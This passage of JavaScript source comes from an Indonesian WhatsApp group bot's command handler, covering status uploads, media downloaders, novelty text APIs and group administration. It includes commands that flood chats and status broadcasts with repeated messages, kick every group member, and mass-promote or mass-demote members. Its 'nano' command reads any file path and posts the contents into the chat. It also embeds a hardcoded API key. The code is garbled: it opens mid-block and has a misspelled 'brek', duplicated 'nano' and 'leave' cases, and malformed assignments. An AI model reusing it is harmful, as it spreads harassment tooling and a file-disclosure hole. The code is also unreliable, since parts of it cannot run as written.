                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
                case 'nano':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return reply('Nama file nya apaa ?')
anu = fs.readFileSync(`${q}`)
reply(String(anu))
brek
                   if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)

                reply('Sukses menghapus chat' + from)
                await sleep(4000)
                Bambang.modifyChat(from, ChatModification.delete)
                break
                case 'mute':
			    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
			    if (!isGroup) return reply(mess.only.group)
                if (isMuted) return reply(`udah mute`)
                mute.push(from)
                fs.writeFileSync('./storage/mute.json', JSON.stringify(mute))
                reply('Bot berhasil dimute di chat ini')
                break
                case 'spam':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					if (!arg) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Bambang.sendMessage(from, argzi[0], MessageType.text)
				}
				break
				case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.bodmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Bambang.groupDemoteAdmin(from, members_id)
                break
                case 'promoteall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
		if (!isGroup) return reply(mess.only.group)
		if (!isBotGroupAdmins) return reply(mess.only.bodmin)
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                Bambang.groupMakeAdmin(from, members_id)
                break
                case 'spamsw':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!arg) return reply(`Penggunaan ${prefix}spamsw teks|jumlah`)
				argzi = arg.split("|")
				if (!argzi) return reply(`Penggunaan ${prefix}spam teks|jumlah`)
				if (Number(argzi[1]) >= 50) return reply('Kebanyakan!')
				if (isNaN(argzi[1])) return reply(`harus berupa angka`)
				for (let i = 0; i < argzi[1]; i++){
					Bambang.sendMessage('status@broadcast', argzi[0], MessageType.text)
                    }
                    break	
                    case 'upswteks':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(10)
                    Bambang.sendMessage('status@broadcast', teks, MessageType.text)
                    reply(`Sukses upload status:\n${teks}`)
                    break	
                    case 'upswlokasi':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
  if (args.length < 1) return reply('Teksnya?')
                    teks = body.slice(12)
                    Bambang.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`${NameBot}`}, MessageType.location)
                    reply(`Sukses upload lokasi:\n${teks}`)
                    break	
                                        case 'upswsticker':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedSticker) return reply('Reply stikernya!')
if (isMedia && !mek.message.videoMessage || isQuotedSticker) {
						const encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						Bambang.sendMessage('status@broadcast', buff, sticker)
						}
						reply(`Sukses upload sticker`)
                    break
                    case 'upswaudio':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						Bambang.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400})
						}
						reply(`Sukses upload audio`)
						break
						case 'upswvoice':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!isQuotedAudio) return reply('Reply audionya!')
if (isMedia && !mek.message.videoMessage || isQuotedAudio) {
						const encmedia = isQuotedAudio ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
						buff = await Bambang.downloadMediaMessage(encmedia)
						Bambang.sendMessage('status@broadcast', buff, audio, {mimetype: 'audio/mp4', duration: 359996400, ptt: true})
						}
						reply(`Sukses upload voice`)
						break
						case 'upswvideo':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                    var konti = body.slice(11)
                    reply(mess.wait)
                    var enmediap = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					var mediap = await Bambang.downloadAndSaveMediaMessage(enmediap)
                    const buffer3 = fs.readFileSync(mediap)
                    Bambang.sendMessage('status@broadcast', buffer3, MessageType.video, {duration: 359996400, caption: `${konti}`})
                    reply(`Sukses upload video:\n${konti}`)
                        break
                        case 'upswgif':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                    var konti = body.slice(7)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Bambang.downloadAndSaveMediaMessage(enmedia)
                    const buffer6 = fs.readFileSync(media)
                    Bambang.sendMessage('status@broadcast', buffer6, MessageType.video, {mimetype : 'video/gif', caption: `${konti}`})
                    reply(`Sukses upload gif:\n${konti}`)
                        break
                        case 'upswimage':
                        if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                    var teksyy = body.slice(11)
                    reply(mess.wait)
                    enmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					media = await Bambang.downloadAndSaveMediaMessage(enmedia)
                    buffer = fs.readFileSync(media)
                    Bambang.sendMessage('status@broadcast', buffer, MessageType.image, {quoted: ftrol, caption: `${teksyy}`})
                    reply(`Sukses upload image:\n${teksyy}`)
                        break
                        case 'shutdown':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				return Bambang.sendMessage(from, JSON.stringify(eval(process.exit())))
				reply('Okey')
				break
				case 'online':
            if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				offline = false
				reply('Status : ONLINE')
				break
			case 'offline':
			if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				offline = true
				reply('Status : OFFLINE')
				break
				                    case 'exif':
                    if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					const exifff = `${args.join(' ')}`
					const namaPackk = exifff.split('|')[0]
					const authorPackk = exifff.split('|')[1]
					exif.create(namaPackk, authorPackk)
					await reply('Done gan')
				break
				case 'setprofile':
				case 'setppbot':
				Bambang.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
					enmediau = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediau = await Bambang.downloadAndSaveMediaMessage(enmediau)
					await Bambang.updateProfilePicture(botNumber, mediau)
					reply('Terima Kasih Kak Pp Barunya😍')
					break
					case 'setnamebot':
					if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
                anu = body.slice(9)
                Bambang.updateProfileName(anu)
                reply(`Sukses mengganti nama ke ${body.slice(9)}`)
                break
                case 'setprefix':
      if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
      if (args.length < 1) return reply(`Contoh ${prefix + command} multi/nopref`)
           if (q === 'multi'){
              multi = true
                    reply(`Berhasil mengubah prefix ke ${q}`)
                } else if (q === 'nopref'){
                    multi = false
                    nopref = true
                    reply(`Berhasil mengubah prefix ke ${c}`)
                } else {
                    multi = false
                    nopref = false
                    prefa = `${q}`
                    reply(`Berhasil mengubah prefix ke ${q}`)
					}
					break
					case 'setbio':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				if (args.length < 1) return reply('Teksnya?')
					iyek = body.slice(8)
					Bambang.setStatus(`${iyek}`)
					reply(`Sukses mengganti bio ke ${body.slice(8)}`)
					break
					case 'leave':
				if (!isGroup) return reply(mess.only.group)
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				Bambang.updatePresence(from, Presence.composing)
				Bambang.groupLeave(from)
						break
						case 'restart':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
reply(`_Restarting ${NameBot}_`)
exec(`cd &&  node index`)
sleep(4000)
reply('Sukses')
break
case 'join':
				if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
				 if (args.length < 1) return reply('Link nya mana?')
					Bambang.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses bergabung dalam group')
break
case 'freeoneday':
				 if (args.length < 1) return reply('Link nya mana?')
					Bambang.query({
json:["action", "invite", `${args[0].replace('https://chat.whatsapp.com/','')}`]
})
reply('Sukses disewa dalam group')
break
case 'readall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                var chats = await Bambang.chats.all()
                chats.map( async ({ jid }) => {
                await Bambang.chatRead(jid)
                })
		var teks = `\`\`\`Successfully read ${chats.length} chats !\`\`\``
	        await Bambang.sendMessage(from, teks, text, {quoted: ftrol})
		console.log(chats.length)
		break
		case 'unreadall':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                var chats = await Bambang.chats.all()
                chats.map( async ({ jid }) => {
                await Bambang.chatRead(jid, 'unread')
                    })
		    var teks = `\`\`\`Successfully unread ${chats.length} chats !\`\`\``
		    await Bambang.sendMessage(from, teks, text, {quoted: ftrol})
		    console.log(chats.length)
	        break
	case 'pin':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                Bambang.modifyChat(from, ChatModification.pin)
                reply('*succes pin this chat*')
                console.log('pinned chat = ' + from)
                break
                case 'unpin':
                if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
                Bambang.modifyChat(from, ChatModification.unpin)
                reply('*succes unpin this chat*')
                console.log('unpin chat = ' + from)
                break
                case 'nano':
if (!isOwner && !mek.key.fromMe) return reply(mess.only.owner)
if (!q) return reply('Nama file nya apaa ?')
anu = fs.readFileSync(`${q}`)
reply(String(anu))
break

case 'ytmp3':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
//if (!isPremium && !mek.key.fromMe) return reply (mess.only.premium)
        //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link Invalid')
            teks = args.join(' ')
            reply('Load')
            res = await y2mateA(teks).catch(e => {
            reply('_[ ! ] Error Gagal Dalam Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP3*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
☞ Title : ${res[0].judul}
☞ Ext : MP3
☞ Size : ${res[0].size}

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, document, {quoted: mek, mimetype: 'audio/mp3', filename: res[0].output})
})
            break
     case 'ytmp4':
     //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
   // if (!isPremium) return reply (mess.only.premium)
           //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
            if (args.length < 1) return reply('Link Nya Mana?')
            if(!isUrl(args[0]) && !args[0].includes('youtu')) return reply('Link Invalid')
            teks = args.join(' ')
            reply(`Wet`)
            res = await y2mateV(teks).catch(e => {
            reply('_[ ! ] Error Gagal Memasuki Web Y2mate_')
})
            result = `┏┉⌣ ┈̥-̶̯͡..̷̴✽̶┄┈┈┈┈┈┈┈┈┈┈┉┓
┆ *YOUTUBE MP4*
└┈┈┈┈┈┈┈┈┈┈┈⌣ ┈̥-̶̯͡..̷̴✽̶⌣ ✽̶

*Data Berhasil Didapatkan!*
☞ Title : ${res[0].judul}
☞ Ext : MP4
☞ Size : ${res[0].size}

_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`

            sendFileFromUrl(res[0].thumb, image, {caption: result, quoted: mek}).then((lalu) => {
            sendFileFromUrl(res[0].link, video, {quoted: mek, mimetype: 'video/mp4', filename: res[0].output})
})
            break
case 'tiktok':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return reply('Link Tiktok Nya Mana:v')
reply(mess.wait)
tthb = fs.readFileSync('./media/tiktok.jpg')
tiktok0 = ``
sendButLocation(from, tiktok0, "Pilih Type Di Bawah Ini", {jpegThumbnail:tthb,name:""}, [{buttonId:`#ttnowm ${q}`,buttonText:{displayText:'NO WM'},type:1},{buttonId:`#ttwm ${q}`,buttonText:{displayText:'WM'},type:1}])
break
case 'ttnowm':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return
reply(mess.wait)
tiktok1 = await fetchJson(`https://rest2yeriko.herokuapp.com/api/tiktok/?url=${q}&apikey=Yuzzu`)
tiktok4 = await getBuffer(tiktok1.result.nowatermark)
Bambang.sendMessage(from, tiktok4, video, {quoted: mek, caption:'Done'})
break
case 'ttwm':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return
reply(mess.wait)
tiktok3 = await fetchJson(`https://rest2yeriko.herokuapp.com/api/tiktok/?url=${q}&apikey=Yuzzu`)
tiktok5 = await getBuffer(tiktok3.result.watermark)
Bambang.sendMessage(from, tiktok5, video, {quoted: mek, caption:'Done'})
break

//═════════════════════════ [ GENERATE MENU ] ═════════════════════════
//═════════════════════════ [ BY NAYLA / RIMURUBOTZ ] ═════════════════════════
//═════════════════════════ [ NAYLA API ] ═════════════════════════		
			
		    case 'kapital':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		  
  if (!q) return reply('Text Nya?')
		    nyz15 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/kapital?query=${q}`)
		    nyz38 = `[ *KAPITAL* ]\n`,
		    nyz38 += `${kotak} *RESULT* : ${nyz15.result.list}`
		    reply(nyz38)
		    break	
		    case 'halah':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		   
 if (!q) return reply('Text Nya?')
		    nyz16 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/halah?query=${q}`)
		    nyz39 = `[ *HALAH* ]\n`,
		    nyz39 += `${kotak} *RESULT* : ${nyz16.result.list}`
		    reply(nyz39)
		    break    	
		    case 'hilih':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		
    if (!q) return reply('Text Nya?')
		    nyz17 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/hilih?query=${q}`)
		    nyz40 = `[ *HILIH* ]\n`,
		    nyz40 += `${kotak} *RESULT* : ${nyz17.result.list}`
		    reply(nyz40)
		    break    	
		    case 'huluh':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})	
	    if (!q) return reply('Text Nya?')
		    nyz18 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/huluh?query=${q}`)
		    nyz41 = `[ *HULUH* ]\n`,
		    nyz41 += `${kotak} *RESULT* : ${nyz18.result.list}`
		    reply(nyz41)
		    break    	
		    case 'heleh':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		  
  if (!q) return reply('Text Nya?')
		    nyz19 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/heleh?query=${q}`)
		    nyz42 = `[ *HELEH* ]\n`,
		    nyz42 += `${kotak} *RESULT* : ${nyz19.result.list}`
		    reply(nyz42)
		    break    	
		    case 'holoh':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		 
   if (!q) return reply('Text Nya?')
		    nyz20 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/holoh?query=${q}`)
		    nyz43 = `[ *HOLOH* ]\n`,
		    nyz43 += `${kotak} *RESULT* : ${nyz20.result.list}`
		    reply(nyz43)
		    break  
		    case 'bilangangka':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		
    if (!q) return reply('Angkanya?')
		    nyz21 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/bilangangka?query=${q}`)
		    nyz44 = `[ *BILANG ANGKA* ]\n`,
		    nyz44 += `${kotak} *RESULT* : ${nyz21.result.list}`
		    Reply(nyz44)
		    break 
		    case 'jumlahangka':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		 
   if (!q) return reply('Angkanya?')
		    nyz22 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/jumlahangka?query=${q}`)
		    nyz45 = `[ *JUMLAH ANGKA* ]\n`,
		    nyz45 += `${kotak} *RESULT* : ${nyz22.result.list}`
		    Reply(nyz45)
		    break  
		    case 'balikhuruf':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})		 
   if (!q) return reply('Text Nya?')
		    nyz23 = await fetchJson(`https://myselfff.herokuapp.com/docs/random/balikhuruf?query=${q}`)
		    nyz46 = `[ *BALIK HURUF* ]\n`,
		    nyz46 += `${kotak} *RESULT* : ${nyz23.result.list}`
		    reply(nyz46)
		    break	

//═════════════════════════ [ SEARCH MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ API RANDOM ] ═════════════════════════


case 'playstore':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if(!q) return reply('lu nyari apa?')
let play = await hx.playstore(q)
let store = '❉─────────────────────❉\n'
for (let i of play){
store += `\n[ *PLAY STORE* ]\n
- *Nama* : ${i.name}
- *Link* : ${i.link}\n
- *Dev* : ${i.developer}
- *Link Dev* : ${i.link_dev}\n❉─────────────────────❉`
}
reply(store)
break
case 'linkwa':
case 'grupwa':
case 'groupwa':
case 'gcwa':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})        
    if(!q) return reply('cari group apa?')
            hx.linkwa(q)
            .then(result => {
            let res = '「 *GC WA* 」\n\n'
            for (let i of result) {
            res += `*Nama*: *${i.nama}\n*Link*: ${i.link}\n\n`
            }
            reply(res)
            });
            break 
case 'lirik':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})        
    if(!q) return reply('lagu apa?')
            reply(mess.wait)
            let song = await hx.lirik(q)
            sendMediaURL(from,song.thumb,song.lirik)
            break
case 'pinterest':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return
reply(mess.wait)
foto = await fetchJson(`https://rest2yeriko.herokuapp.com/api/pinterest/?text=${q}&apikey=Yuzzu`)
fotoget = await getBuffer(foto.result)
Bambang.sendMessage(from, fotoget, image, {quoted: mek})
break
case 'wiki': case 'wikipedia':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return
reply(mess.wait)
ilmu = await fetchJson(`https://rest2yeriko.herokuapp.com/api/wikipedia?search=${q}&apikey=Yuzzu`)
ilmu2 = `*Nama* : ${q}\n*Hasil* : ${ilmu.result.result}`
reply(ilmu2)
break
case 'kbbi':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return
reply(mess.wait)
ilmu3 = await fetchJson(`https://rest2yeriko.herokuapp.com/api/kbbi?kata=${q}&apikey=Yuzzu`)
ilmu4 =`*Nama* : ${q}\n*Hasil* : ${ilmu3.result.arti}`
reply(ilmu4)
break
case 'kodepos': case 'codepos':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!q) return
reply(mess.wait)
ilmu5 = await fetchJson(`https://rest2yeriko.herokuapp.com/api/kodepos?kota=${q}&apikey=Yuzzu`)
ilmu6 = 'KODE POS\n'             
for (let nyz of ilmu5.result.data) {
ilmu6 += `${buletan} *PROVINCE* : ${nyz.province}\n`
ilmu6 += `${buletan} *CITY* : ${nyz.city}\n`
ilmu6 += `${buletan} *SUBDISTRICT* : ${nyz.subdistrict}\n`
ilmu6 += `${buletan} *URBAN* : ${nyz.urban}\n`
ilmu6 += `${buletan} *POSTALCODE* : ${nyz.postalcode}\n\n`            
}
reply(ilmu6)
break


//═════════════════════════ [ ADMIN MENU ] ═════════════════════════
//═════════════════════════ [ COPAS AJA ] ═════════════════════════
//═════════════════════════ [ NO API ] ═════════════════════════


      case 'antilink':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
        if (!isGroup) return reply(mess.only.group)
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
        if (args[0] == 'on') {
          if (isAntiLink) return reply('Sudah aktif!!')
          antilink.push(from)
          fs.writeFileSync(
            './database/antilink.json',
            JSON.stringify(antilink)
          )
          reply('Sukses mengaktifkan antilink!')
        } else if (args[0] == 'off') {
          antilink.splice(from, 1)
          fs.writeFileSync(
            './database/antilink.json',
            JSON.stringify(antilink)
          )
          reply('Sukses mematikan antilink!')
        } else if (!q) {
          sendButMessage(from, `FORMAT SALAH BANG!!!`, `Kalo Button Nya Gaada/Udah Di Klik Orang Gini :\nAktif : ${prefix}antilink on\nMati : ${prefix}antilink off\n\n\nKalo Bkn Admin Gwsh Banyak Tingkah Kalo Ga Bakalan Ke Kick!`, [
            {
              buttonId: `${prefix}antilink on`,
              buttonText: {
                displayText: `AKTIF`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antilink off`,
              buttonText: {
                displayText: `NON-AKTIF`,
              },
              type: 1,
            },
          ]);
        }
        break
       case 'welcome':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})        
       if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
               if (!isGroup) return reply(mess.only.group)
               if (args.length < 1) return reply('!welcome on/off')
               if ((args[0]) === 'on') {
               if (isWelkom) return reply('Udah aktif')
               welkom.push(from)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses mengaktifkan fitur welcome di group ini ✔️')
               } else if ((args[0]) === 'off') {
               welkom.splice(from, 1)
               fs.writeFileSync('./database/group/welcome.json', JSON.stringify(welkom))
               reply('Sukses menonaktifkan fitur welcome di group ini ✔️')
               } else {
               reply('Enable untuk mengaktifkan, disable untuk menonaktifkan')
}
               break
case 'linkgc':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})////(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
				if (!isGroup) return reply(mess.only.group)
				linkgc = await Bambang.groupInviteCode (from)
				yeh = `https://chat.whatsapp.com/${linkgc}\n\nlink Group *${groupName}*`
				Bambang.sendMessage(from, yeh, text, {quoted: mek})
				break
            case 'kick':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
             if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
             if (!isGroup) return reply(mess.only.group)
             kick(from, mentionUser)
             break
      case 'add':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
      if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
             if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
             entah = arg.split("|")[0]
             entah = entah.replace(new RegExp("[()+-/ +/]", "gi"), "")
             entah = `${entah}@s.whatsapp.net`
             Bambang.groupAdd(from, [entah])
             } else {
             entah = mek.message.extendedTextMessage.contextInfo.participant
             Bambang.groupAdd(from, [entah])
}
             break
case 'promote' :
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, 𝐊𝐚𝐦𝐮 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Bambang.groupMakeAdmin(from, mentioned)
} else {
mentions(`𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, @${mentioned[0].split('@')[0]} 𝐊𝐚𝐦𝐮 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 𝐃𝐢 𝐆𝐫𝐨𝐮𝐩 *${groupMetadata.subject}*`, mentioned, true)
Bambang.groupMakeAdmin(from, mentioned)
}
break
case 'demote' :
 //(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
if (!isGroup) return reply(mess.only.group)
if (!isGroupAdmins) return reply(mess.only.admin)
if (!isBotGroupAdmins) return reply(mess.only.bodmin)
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tidak jadi admin!')
mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
if (mentioned.length > 1) {
teks = '𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, 𝐊𝐚𝐦𝐮 𝐓𝐢𝐝𝐚𝐤 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐀𝐝𝐦𝐢𝐧 𝐋𝐚𝐠𝐢 :\n'
for (let _ of mentioned) {
teks += `@${_.split('@')[0]}\n`
}
mentions(teks, mentioned, true)
Bambang.groupDemoteAdmin(from, mentioned)
} else {
mentions(`𝐏𝐞𝐫𝐢𝐧𝐭𝐚𝐡 𝐃𝐢 𝐓𝐞𝐫𝐢𝐦𝐚, 𝐌𝐞𝐧𝐮𝐫𝐮𝐧𝐤𝐚𝐧 : @${mentioned[0].split('@')[0]} 𝐌𝐞𝐧𝐣𝐚𝐝𝐢 𝐌𝐞𝐦𝐛𝐞𝐫`, mentioned, true)
Bambang.groupDemoteAdmin(from, mentioned)
}
break
       case 'setgrupname':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return 
              if (args.length == 0) return reply(`Penggunaan ${prefix}setgrupname name`)
              Bambang.groupUpdateSubject(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              break
       case 'setdesc':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (args.length == 0)  return reply(`Penggunaan ${prefix}setdesc desc`)
              Bambang.groupUpdateDescription(from, q)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              break
       case 'setppgrup':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              if (!isBotGroupAdmins) return reply(mess.only.Badmin)
              if (isQuotedImage) {
              let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
              let media = await Bambang.downloadMediaMessage(encmedia)
              Bambang.updateProfilePicture(from, media)
             .then((res) => reply(jsonformat(res)))
             .catch((err) => reply(jsonformat(err)))
              } else {
              reply(`Kirim atau tag gambar dengan caption ${prefix}setppgrup`)
}
              break
case 'tagall':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              let arr = [];
              let txti = `*[ TAG ALL ]*\n\n${q ? q : ''}\n\n`
              for (let i of groupMembers){
              txti += `=> @${i.jid.split("@")[0]}\n`
              arr.push(i.jid)
}
              mentions(txti, arr, true)
              break
       case 'kickall':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek}) // Anti Banned
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              for (let i of groupMembers) {
              await kickMember(from, [i.jid])
}
              break
       case 'leave':
//(!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: mek})
              if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.only.admin)
              if (!isGroup) return reply(mess.only.group)
              setTimeout( () => {
              Bambang.groupLeave(from) 
              }, 2000)
              setTimeout( () => {
              reply('Byee...')
              }, 0)
              break
